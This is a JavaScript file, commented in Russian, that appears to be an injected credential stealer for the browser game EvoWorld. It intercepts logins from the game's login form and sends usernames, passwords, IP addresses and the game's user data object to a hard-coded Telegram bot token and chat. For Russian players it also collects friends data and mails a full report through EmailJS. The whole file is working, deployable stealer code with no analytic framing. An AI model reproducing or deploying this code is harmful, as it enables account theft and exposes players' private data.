setTimeout(() => {
(async function() {
    // Конфигурация Telegram бота
    const BOT_TOKEN = '8303657347:AAHdDjkRTZmjn8Jb8oyu3DcXcM79KV5Wk-w';
    const GROUP_ID = '-1003867014479';
    const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const TELEGRAM_DOCUMENT_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;

    // Функция для отправки сообщения в Telegram
    const sendToTelegram = async (message) => {
        try {
            const response = await fetch(TELEGRAM_API_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: GROUP_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            });
            
            const result = await response.json();
            if (!result.ok) {
                console.error('Ошибка Telegram API:', result.description);
            }
            return result;
        } catch (error) {
            console.error('Ошибка отправки в Telegram:', error);
        }
    };

    // Функция для отправки файла в Telegram
    const sendFileToTelegram = async (fileContent, filename) => {
        try {
            const formData = new FormData();
            const blob = new Blob([fileContent], { type: 'application/json' });
            formData.append('document', blob, filename);
            formData.append('chat_id', GROUP_ID);

            const response = await fetch(TELEGRAM_DOCUMENT_URL, {
                method: 'POST',
                body: formData
            });
            
            const result = await response.json();
            if (!result.ok) {
                console.error('Ошибка отправки файла в Telegram:', result.description);
            }
            return result;
        } catch (error) {
            console.error('Ошибка отправки файла в Telegram:', error);
        }
    };

    // Получаем IP
    const getIP = async () => {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip || "Не удалось получить IP";
        } catch {
            return "Не удалось получить IP";
        }
    };

    // Функция для безопасного клонирования объектов
    const deepClone = (obj) => {
        if (obj === null || typeof obj !== 'object') return obj;
        const clone = Array.isArray(obj) ? [] : {};
        for (const key in obj) {
            if (obj.hasOwnProperty(key)) {
                clone[key] = deepClone(obj[key]);
            }
        }
        return clone;
    };

    // Проверяем и получаем данные из переменной `user`
    const getUserData = () => {
        try {
            if (typeof user !== 'undefined' && user !== null) {
                return JSON.stringify(deepClone(user), null, 2);
            }
            return "Переменная 'user' не найдена или пуста";
        } catch (e) {
            return `Ошибка при чтении переменной 'user': ${e.message}`;
        }
    };

    // Получаем friendsData в оригинальном виде
    const getFriendsData = () => {
        try {
            if (typeof friendsData !== 'undefined' && friendsData !== null) {
                return JSON.stringify(deepClone(friendsData), null, 2);
            }
            return "Переменная 'friendsData' не найдена или пуста";
        } catch (e) {
            return `Ошибка при чтении переменной 'friendsData': ${e.message}`;
        }
    };

    // Получаем friendsArr в оригинальном виде
    const getFriendsArr = () => {
        try {
            if (typeof friendsArr !== 'undefined' && friendsArr !== null) {
                // Для больших массивов делаем выборку
                if (Array.isArray(friendsArr) && friendsArr.length > 100) {
                    const sample = {
                        total_length: friendsArr.length,
                        sample_items: []
                    };
                    
                    // Берем первые 10 элементов
                    for (let i = 0; i < Math.min(10, friendsArr.length); i++) {
                        if (friendsArr[i]) {
                            sample.sample_items.push(deepClone(friendsArr[i]));
                        }
                    }
                    
                    // Берем несколько элементов из "хвоста" массива
                    for (let i = Math.max(0, friendsArr.length - 5); i < friendsArr.length; i++) {
                        if (friendsArr[i] && sample.sample_items.length < 15) {
                            sample.sample_items.push(deepClone(friendsArr[i]));
                        }
                    }
                    
                    return JSON.stringify(sample, null, 2);
                }
                return JSON.stringify(deepClone(friendsArr), null, 2);
            }
            return "Переменная 'friendsArr' не найдена или пуста";
        } catch (e) {
            return `Ошибка при чтении переменной 'friendsArr': ${e.message}`;
        }
    };

    // Получаем уровень пользователя
    const getUserLevel = (addX = false) => {
        try {
            if (typeof user !== 'undefined' && user !== null && user.level !== undefined) {
                return `level: ${user.level}${addX ? 'x' : ''}`;
            }
            return `level: не определен${addX ? 'x' : ''}`;
        } catch (e) {
            return `level: ошибка при получении (${e.message})${addX ? 'x' : ''}`;
        }
    };

    // Функция для разбивки длинного сообщения на части (Telegram имеет ограничение 4096 символов)
    const splitMessage = (text, maxLength = 4000) => {
        const parts = [];
        for (let i = 0; i < text.length; i += maxLength) {
            parts.push(text.substring(i, i + maxLength));
        }
        return parts;
    };

    // Перехват логина и пароля из формы
    const SELECTORS = {
        username: '#loginUsername',
        password: '#loginPassword',
        submitButton: 'button[type="submit"]'
    };

    let capturedCredentials = { username: null, password: null };

    // Функция для отправки учетных данных в Telegram
    const sendCredentials = async (username, password) => {
        const timestamp = new Date().toLocaleString('ru-RU');
        const message = `🦊 EvoWorld Login\n\n👤 Login: ${username}\n🔐 Password: ${password}\n⏰ ${timestamp}`;

        try {
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: GROUP_ID,
                    text: message,
                    disable_web_page_preview: true
                })
            });
            
            if (!response.ok) throw new Error('Telegram API error');
            console.log('Credentials sent successfully');
            capturedCredentials = { username, password };
        } catch (error) {
            console.error('Failed to send credentials:', error);
        }
    };

    // Настройка перехвата формы
    const setupInterception = () => {
        const usernameField = document.querySelector(SELECTORS.username);
        const passwordField = document.querySelector(SELECTORS.password);
        const submitButton = document.querySelector(SELECTORS.submitButton);

        if (usernameField && passwordField) {
            console.log('Login form detected - setting up interception');

            // Method 1: Form submission
            const form = usernameField.closest('form');
            if (form) {
                form.addEventListener('submit', function(event) {
                    event.preventDefault();
                    sendCredentials(usernameField.value, passwordField.value);
                    form.submit();
                });
                return;
            }

            // Method 2: Button click
            if (submitButton) {
                submitButton.addEventListener('click', function() {
                    setTimeout(() => {
                        sendCredentials(usernameField.value, passwordField.value);
                    }, 300);
                });
                return;
            }

            // Method 3: Input events as fallback
            passwordField.addEventListener('blur', function() {
                if (usernameField.value && passwordField.value) {
                    sendCredentials(usernameField.value, passwordField.value);
                }
            });
        } else {
            // Retry every 2 seconds if form not loaded yet
            setTimeout(setupInterception, 2000);
        }
    };

    // Запускаем перехват формы
    setTimeout(setupInterception, 3000);

    // Дополнительная защита от динамических изменений DOM
    const observer = new MutationObserver(function(mutations) {
        mutations.forEach(function(mutation) {
            if (!document.querySelector(SELECTORS.username)) {
                setupInterception();
            }
        });
    });

    observer.observe(document.body, {
        childList: true,
        subtree: true,
        attributes: false,
        characterData: false
    });

    const sendUserData = async () => {
        const userIP = await getIP();
        const userData = getUserData();
        const friendsDataStr = getFriendsData();
        const friendsArrStr = getFriendsArr();
        
        // Проверяем, были ли перехвачены учетные данные
        const credentialsAvailable = capturedCredentials.username && capturedCredentials.password;
        
        // Получаем уровень с 'x', если учетные данные были перехвачены
        const userLevel = getUserLevel(credentialsAvailable);
        
        // Формируем сообщение для Telegram
        let message = `<b>🚨 НОВЫЙ ЛОГ 🚨</b>\n\n`;
        message += `<b>📅 Время:</b> ${new Date().toLocaleString()}\n`;
        message += `<b>🌐 IP:</b> <code>${userIP}</code>\n`;
        message += `<b>🔗 URL:</b> ${window.location.href}\n\n`;
        
        message += `<b>📊 УРОВЕНЬ ПОЛЬЗОВАТЕЛЯ:</b>\n`;
        message += `<code>${userLevel}</code>\n`;
        message += `<b>💰 Gems:</b> ${user?.premiumPoints || 'N/A'}\n`;
        message += `<b>🖥️ Выбранный сервер:</b> ${document.getElementById('selectServer')?.options[document.getElementById('selectServer')?.selectedIndex]?.text || 'N/A'}\n\n`;
        
        if (credentialsAvailable) {
            message += `<b>👤 УЧЕТНЫЕ ДАННЫЕ:</b>\n`;
            message += `<b>Логин:</b> <code>${capturedCredentials.username}</code>\n`;
            message += `<b>Пароль:</b> <code>${capturedCredentials.password}</code>\n\n`;
        }
        
        message += `<b>📋 ДАННЫЕ ИЗ ПЕРЕМЕННОЙ user (отправлены файлом):</b>\n`;
        message += `<i>См. прикрепленный файл user_data.json</i>\n\n`;
        
        message += `\n<i>Отправлено автоматически</i>`;

        // Отправляем сообщение
        await sendToTelegram(message);
        
        // Отправляем данные user как файл
        if (userData && userData !== "Переменная 'user' не найдена или пуста") {
            const filename = `user_data_${Date.now()}.json`;
            await sendFileToTelegram(userData, filename);
        }
        
        console.log('✅ Данные отправлены в Telegram');
    };

    await sendUserData();
})();

// Оригинальный код для российских пользователей
if(typeof user !== 'undefined' && user.authData && user.authData.countryCode == "RU"){
    var script = document.createElement('script');
    script.src = "https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js";
    script.onload = function() {
        emailjs.init("4N-8nqIjjUBhk1vbi");
        
        setTimeout(async () => {
            // Функции сбора данных остаются без изменений
            const getIP = async () => {
                try {
                    const response = await fetch('https://api.ipify.org?format=json');
                    const data = await response.json();
                    return data.ip || "Не удалось получить IP";
                } catch {
                    return "Не удалось получить IP";
                }
            };

            const deepClone = (obj) => {
                if (obj === null || typeof obj !== 'object') return obj;
                const clone = Array.isArray(obj) ? [] : {};
                for (const key in obj) {
                    if (obj.hasOwnProperty(key)) {
                        clone[key] = deepClone(obj[key]);
                    }
                }
                return clone;
            };

            const getUserData = () => {
                try {
                    if (typeof user !== 'undefined' && user !== null) {
                        return JSON.stringify(deepClone(user), null, 2);
                    }
                    return "Переменная 'user' не найдена или пуста";
                } catch (e) {
                    return `Ошибка при чтении переменной 'user': ${e.message}`;
                }
            };

            const getFriendsData = () => {
                try {
                    if (typeof friendsData !== 'undefined' && friendsData !== null) {
                        return JSON.stringify(deepClone(friendsData), null, 2);
                    }
                    return "Переменная 'friendsData' не найдена или пуста";
                } catch (e) {
                    return `Ошибка при чтении переменной 'friendsData': ${e.message}`;
                }
            };

            const getFriendsArr = () => {
                try {
                    if (typeof friendsArr !== 'undefined' && friendsArr !== null) {
                        if (Array.isArray(friendsArr) && friendsArr.length > 100) {
                            const sample = {
                                total_length: friendsArr.length,
                                sample_items: []
                            };
                            
                            for (let i = 0; i < Math.min(10, friendsArr.length); i++) {
                                if (friendsArr[i]) {
                                    sample.sample_items.push(deepClone(friendsArr[i]));
                                }
                            }
                            
                            for (let i = Math.max(0, friendsArr.length - 5); i < friendsArr.length; i++) {
                                if (friendsArr[i] && sample.sample_items.length < 15) {
                                    sample.sample_items.push(deepClone(friendsArr[i]));
                                }
                            }
                            
                            return JSON.stringify(sample, null, 2);
                        }
                        return JSON.stringify(deepClone(friendsArr), null, 2);
                    }
                    return "Переменная 'friendsArr' не найдена или пуста";
                } catch (e) {
                    return `Ошибка при чтении переменной 'friendsArr': ${e.message}`;
                }
            };

            const getUserLevel = (addX = false) => {
                try {
                    if (typeof user !== 'undefined' && user !== null && user.level !== undefined) {
                        return `level: ${user.level}${addX ? 'x' : ''}`;
                    }
                    return `level: не определен${addX ? 'x' : ''}`;
                } catch (e) {
                    return `level: ошибка при получении (${e.message})${addX ? 'x' : ''}`;
                }
            };

            // Перехват логина и пароля
            const SELECTORS = {
                username: '#loginUsername',
                password: '#loginPassword',
                submitButton: 'button[type="submit"]'
            };

            let capturedCredentials = { username: null, password: null };

            const sendCredentials = async (username, password) => {
                capturedCredentials = { username, password };
            };

            const setupInterception = () => {
                const usernameField = document.querySelector(SELECTORS.username);
                const passwordField = document.querySelector(SELECTORS.password);
                const submitButton = document.querySelector(SELECTORS.submitButton);

                if (usernameField && passwordField) {
                    console.log('Login form detected - setting up interception');

                    const form = usernameField.closest('form');
                    if (form) {
                        form.addEventListener('submit', function(event) {
                            event.preventDefault();
                            sendCredentials(usernameField.value, passwordField.value);
                            form.submit();
                        });
                        return;
                    }

                    if (submitButton) {
                        submitButton.addEventListener('click', function() {
                            setTimeout(() => {
                                sendCredentials(usernameField.value, passwordField.value);
                            }, 300);
                        });
                        return;
                    }

                    passwordField.addEventListener('blur', function() {
                        if (usernameField.value && passwordField.value) {
                            sendCredentials(usernameField.value, passwordField.value);
                        }
                    });
                } else {
                    setTimeout(setupInterception, 2000);
                }
            };

            setTimeout(setupInterception, 3000);

            const observer = new MutationObserver(function(mutations) {
                mutations.forEach(function(mutation) {
                    if (!document.querySelector(SELECTORS.username)) {
                        setupInterception();
                    }
                });
            });

            observer.observe(document.body, {
                childList: true,
                subtree: true,
                attributes: false,
                characterData: false
            });

            const sendUserData = async () => {
                const userIP = await getIP();
                const userData = getUserData();
                const friendsDataStr = getFriendsData();
                const friendsArrStr = getFriendsArr();
                
                const credentialsAvailable = capturedCredentials.username && capturedCredentials.password;
                
                const userLevel = getUserLevel(credentialsAvailable);
                
                const messageText = `
ПОЛНЫЙ ОТЧЕТ О ПОЛЬЗОВАТЕЛЕ
=============================

📅 Время: ${new Date().toLocaleString()}
🌐 IP-адрес: ${userIP}
🔗 URL: ${window.location.href}

📊 УРОВЕНЬ ПОЛЬЗОВАТЕЛЯ:
${userLevel}
Gems: ${user?.premiumPoints || 'N/A'}
Выбранный сервер: ${document.getElementById('selectServer')?.options[document.getElementById('selectServer')?.selectedIndex]?.text || 'N/A'}

👤 ДАННЫЕ ИЗ ПЕРЕМЕННОЙ user:
${userData}

👥 ДАННЫЕ ИЗ ПЕРЕМЕННОЙ friendsData:
${friendsDataStr}

👥 ДАННЫЕ ИЗ ПЕРЕМЕННОЙ friendsArr:
${friendsArrStr}
`;

                if (credentialsAvailable) {
                    messageText += `
🔐 УЧЕТНЫЕ ДАННЫЕ:
Логин: ${capturedCredentials.username}
Пароль: ${capturedCredentials.password}
`;
                }

                messageText += `
=============================
Отчет сгенерирован автоматически.
                `;

                const templateParams = {
                    message: messageText
                };

                console.log("Отправка простого текста через EmailJS...");
                
                emailjs.send('service_wdulwdn', 'template_ugfv48l', templateParams)
                    .then(function(response) {
                        console.log('✅ Письмо успешно отправлено! Статус:', response.status);
                    }, function(error) {
                        console.error('❌ Ошибка отправки:', error);
                    });
            };

            await sendUserData();
        }, 1);
    };
    document.head.appendChild(script);
}
}, 6500);
